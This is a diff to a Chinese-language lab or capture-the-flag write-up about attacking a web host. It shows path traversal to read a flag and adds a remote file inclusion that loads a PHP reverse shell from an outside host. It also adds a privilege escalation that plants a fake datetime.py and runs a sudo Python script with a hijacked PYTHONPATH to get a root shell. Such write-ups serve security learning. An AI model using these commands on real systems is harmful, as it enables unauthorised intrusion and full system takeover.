@@ -121,8 +121,15 @@ http://10.10.110.102:8080/index.php?page=../../../../opt/flag.txt
 
 顺便包含一个 webshell 上去就能 rce
 
-## Port 80 SimpleCMS 命令执行 可能
-
 ```plaintext
-Simple v2.2.15 远程命令执行漏洞(CVE-2022-23906)
+http://10.10.110.102:8080/index.php?page=http://10.10.10.10/php-reverse-shell.php 
+```
+
+## 提权
+
+```bash
+touch /tmp/datetime.py
+echo "import pty" >> /tmp/datetime.py
+echo 'pty.spawn("/bin/bash")' >> /tmp/datetime.py
+sudo PYTHONPATH=/tmp /usr/bin/python3 /opt/time_check.py
 ```
